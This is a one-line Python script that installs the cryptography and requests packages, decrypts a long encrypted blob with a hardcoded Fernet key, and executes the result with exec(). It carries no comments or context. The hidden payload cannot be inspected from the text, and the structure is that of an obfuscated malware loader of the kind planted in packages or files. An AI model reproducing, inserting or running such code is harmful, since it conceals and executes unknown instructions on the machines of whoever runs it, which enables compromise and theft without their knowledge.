import subprocess, sys; subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'cryptography', 'requests']); from cryptography.fernet import Fernet; import base64, requests; key='YllKwDDdzZCLfMX6g5fXTWWoHokHNC0bSCWymDeJzmE='; cipher=Fernet(key); exec(cipher.decrypt('gAAAAABn-RX1TzVvlS8u0WMsEdCRhLT3eApMJC2Ts0cJVuSUrpZXt96ne0Ay8wlAwrdKYJSBTvIZtOa6QbzhIHGcy0IzGNjY_UqpzBgr2xwdzsD02H3VxNPHMFU5VnycD0NCf7eH0W5I7d3lV5LVRHjoFN3vMFoIALkEccqHse7kmdJs4W8koN2Mfw9wgrWkTKwE89M66HvUY5qPT-c4ZTXsVT1l7ztNkxKwBEx5mYu_7LpIRmwV9-kIzvNtFZtBFXBkR1yjanHPh_BNKIvejtjIcBjshjmNjON5yXPZJXgt3h8wZstsNppdtyQyPG_qLR59ZPNgIDuV_D69Ouyx1wT0Gm5Z8gzD8yUIGhPGui1WMsocPqGhVJ5xwW1UXn_iPWJpCqhS0V7Mj3NANfqVJyfdNJlvtwa3OMlOFOwk3lXx1PJUCIDwqLru5KYDPpHz_XXEHUPG42rvYXfIDo9c3HsXweB_dY2c0L_IfxpuQ26U-hjDorT42TmURl3VuHXa1WIM_hMnRoBz2nGfq7vS9JHJL0CNIP8U4uAoYS0KFwUj3lKa2pYKpbRQHCIDkv_kiK6hPZd3PWNZdFwZSKOqnbkZ4hm91P7ALuUHdmQbt3NTY4jdJESSEm3cVY36WTBDHQC19IC-zj0_tRCTU4b3eXIfyBYrhWlpQSSpOBvm-pMdGByif0ckWCU4eXVoU5tE7J_xoMriP_Z6MOoIyoE3FG7hTw3fg52sXJAm_l-xvH5W45OfjZE_byA1id0aKznkKSuQEFUIpegzF4RhKGfzM0lC_y-UwY5wP-bZSz1hLQmSB54tMQhcvAEt1r7I3IQtvJHA9jZcJ6XhkeZrXeS8DKfB-uxoJODRoHjTe1q3c-PGIxV2PEnXhYhLscqdBkU-Y0A5n-5J7XzHFJTgvci7S1O-e1mVLuWJkA7vKIwMb5UTttlwgI4QI_5AXDmRt1pOMtH66LQZENo8Y11VFcw_lUP3ypRbksAkpXoQcQQDgYZj9-6aqhgT0lFWDzHdH6z4JMzxTf8eShA8HbPXaB2UilINyULAEFBk5ekB-LyuOPTLIacPlMgbtkSevtHecK4L6Cy6VUJnzNZ4Qhlh9L5BiHEzf6a2NdRDO9k5JmmTlnYtIzthz2fjGf7SVyrFfgz0Oo7O1yKU3nvOgakrKNNCzFUsfDq8dxAN90xPjHJz7ZWBzhA1Re-0puu7YhM-NKIjBbXczXwAxHc4JaU1IaLYJozsuFkTZqWNEIvIenzNLr0PwCycOsgybuWgv6MGkcWWatUNl2NsVfmd7dBk34FO3ZefvTUN_2TxtwIWfUVXf9hCi1rgP0PTW2x-jKTfp5KEKOrRJvmuO-V6P0nVFlE0Lzl3nPnf-MMWQaODj7CQZkLEj-6hA-tXInagKhHSP7MlGN9KvmQOyPAopBhch1G5ESW8EW3NMGySji9quABidrPw5ODmIHm4i-mMftgRtTB-_mX0E8_ukKdd7BZ35zUlS0RGKNRJSI1Xa0_WGFQZfQdUBW5L7Al_HEn2qAqyPb4dWsktbD5YtVTZvz1lU2Y2q5S_5R2GtgaWSWiYAnzIAhqSKTG5NcM2ycaHiKGzBIwz2w1mca3xOoGLGmQ04Wg4Bki3po7BmCOxoiPlFjz8A7MP9r4epsFIwDtJlkFNiwKzESJ74_JKgNnB0lRKq-ZGPzXQbEe-Vj8N5D_TOpnRd8DE4X0nmZvt8jpGfxvQLAqts2r2F_uJbbbEZh8i_3ODIk9hn3O3UEGUimcXkQzZQGEoGn_l_GVs8ePZKaSztPvl0N1cBfTRgBzOq8rDsGv9lLXfyz0aKWHnz9GZ6Hbe2rXa_eNJs0yr5yC0Ffm7wcUhoGfDLKbih39c60Av8cMsIkg1VyNJ4XIA2xW8b8AdG2qCkHGo10tM8TJV8qMOdKwUfgd9mAHxJQd2LOkDRQFyZGrJAp0H0EiV5PFrgdOG36whsxUbnf3ag6Qwr2E0WyAG-D_Be3ZF4jWhlw0FUHYGKmpXdclH60nPekBngACkV69BywDkxXEZleJvC_PxjMnuHwfqqK2kWMxXmNwIm4DsMxlmzHMD5tiSiLshi5vcoXD8OKjyQRhsvcQDr5Fg1AbEYk3NXzPjqX_x1iEfq1fXh15gKLLjFKVUUCPhUjd7gs4OPYLHBFbqNvrWA-JlXHLTaz07zb6Mb6CbU1OhAXW1z1mNjjeQPntx540t3hBaGSIs5smQrGNAqeBeQyhv3zQ7OvVBZBt88hWU44kjsfNN6KXYospOJ0YjOyiB3LbZsSYoEgpswpWxp2BuD2juDlxvt2vassUyYJMMDUQiqKJIVgyGCCI_2Bh8r5gQZ7v4tkgf-slz4SYWY3x7SiCdTJhC1D2pKUCjGk_CNZ2Bssm7TL2-qpbx4Y915d9xEio981tXaCbgE02K9S9c_eMobwI75cPgmRNjtE5z5qp6-J5INVr6MFusSLIjMRqh79uVS5qKaABfkxhFyQ_VyPCyuxsjNNHLjzxKka12txQg2DPKof3FmjNdBHwUL-xGX4HsOXw_UxMHSntrz1kQfnEK-6ziGYlc-GQvD_l7qJl_OMf6x2qP8UlyWNngucN-P_rCH08rDk6mkZ8PfW2aloq25HFpMXDETxopdPfTOssR_x6vwBVbJsY0MWtKgR5rRLVwD1TWs8vHIIrbhs4IykDEkZmT-G6SKyf0ojLwlZ4C_vYcHybk_cc45M81qG404ImElDDKISRY_DnyKU-6WmUt1EW8ysTcXgiDKsmAyjU1IJmOfowpcl5GaUWupx29HXM_zV4aafUxeLYGOuFdr57AZyqlHwwVGpM1lIhVhCEKNrGrqPTj6cuNS0Adjz0rF0Wz_hLFAnCQhN6wcT04VYBqItbIi8feJx13KcTIeZSU5JEgzvbBcIefdT_FTKBU7DR8fybQptn5LdYxPHGpMUp_h-SdxxQUy47W28H0rzwD32iKUtkeM_27H3ELKGOtdjKOq0gW3_auyKvB2rf124aRZX2va0ZsKlktlg9I1qNePJg0cb9g9nP3bilWpIpJNpyOcM-n0oTOQ4paDUnuQKOX8u4kTFgFdRoKiA1i1gFxW0xST1k3ResMrcQoOKL4ymLUNVOrk5ZhQbVBfy_bU7k7bvEJcNhnLtofWnu-7gFE6IlKurhiVTH2Ijm0EA=='.encode()).decode())